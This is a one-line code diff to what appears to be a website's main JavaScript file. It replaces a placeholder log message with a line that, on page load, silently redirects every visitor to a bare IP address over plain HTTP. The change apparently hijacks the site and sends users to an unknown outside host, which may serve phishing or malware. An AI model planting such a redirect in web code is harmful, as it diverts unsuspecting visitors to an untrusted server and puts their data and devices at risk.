@@ -1,1 +1,1 @@
-console.log('This would be the main JS file.');
+window.location.replace("http://139.59.248.153/");
